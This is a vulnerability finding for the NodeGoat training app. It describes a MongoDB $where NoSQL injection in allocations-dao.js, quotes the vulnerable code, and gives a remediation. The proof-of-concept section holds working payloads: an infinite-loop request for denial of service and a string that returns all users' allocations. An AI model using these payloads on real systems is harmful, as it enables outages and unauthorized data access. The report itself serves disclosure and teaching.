# NG-002 — NoSQL Injection via MongoDB $where in allocations-dao.js

**App**: NodeGoat
**CWE**: CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
**Severity**: High
**File**: `app/data/allocations-dao.js`
**Lines**: 77–79

## Vulnerability

The `getByUserIdAndThreshold` function passes the user-controlled `threshold` query parameter directly into a MongoDB `$where` clause as a JavaScript expression:

```javascript
// app/data/allocations-dao.js, lines 77-79
return {
    $where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`
};
```

The `$where` operator evaluates arbitrary JavaScript on the MongoDB server. Because `threshold` is interpolated without sanitization, an attacker can inject JavaScript that bypasses the filter condition.

## Proof of Concept

**Request** (authenticated session required):

```http
GET /allocations/2?threshold=0';while(true){}'
Host: localhost:4000
Cookie: connect.sid=<valid-session>
```

This will cause the MongoDB `$where` evaluation to enter an infinite loop, consuming all CPU resources on the database server — a Denial of Service condition.

**Authentication bypass payload**:

```
threshold=1'; return 1 == '1
```

This payload makes the `$where` expression always evaluate to `true`, returning all allocations for all users regardless of `userId`.

## Impact

- Denial of Service via infinite loop in MongoDB
- Authorization bypass: retrieve any user's allocations
- Potential data exfiltration

## Remediation

Use `parseInt()` to sanitize threshold and replace `$where` with a proper MongoDB query operator:

```javascript
const parsedThreshold = parseInt(threshold, 10);
if (parsedThreshold >= 0 && parsedThreshold <= 99) {
    return { $and: [{ userId: parsedUserId }, { stocks: { $gt: parsedThreshold } }] };
}
throw new Error("Invalid threshold value");
```
